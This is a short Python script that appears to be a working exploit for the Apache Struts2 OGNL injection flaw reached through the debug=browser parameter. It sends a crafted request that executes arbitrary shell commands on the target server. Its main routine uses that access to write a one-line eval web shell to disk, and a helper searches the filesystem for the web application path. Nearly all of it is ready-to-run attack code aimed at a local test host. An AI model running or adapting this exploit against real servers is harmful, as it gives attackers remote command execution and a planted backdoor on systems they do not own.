# coding:utf-8

import requests
import re


def explot(url, cmd):
    exp = '''/?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command={}'''
    link = url+exp.format(cmd)
    res = requests.get(link)
    return res.text

def findwebpath():
    url = 'http://localhost:8086/orders'
    cmd = 'find / -name *.jsp'
    str = explot(url, cmd)
    re_webpath = re.compile(r'.+webapps\/\w+\/')
    webpath = re_webpath.search(str)
    print webpath.group()



if __name__ == '__main__':
    url = 'http://localhost:8086/orders'
    cmd = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > /home/shell01.jsp'''
    res = explot(url, cmd)
    print res
    # findwebpath()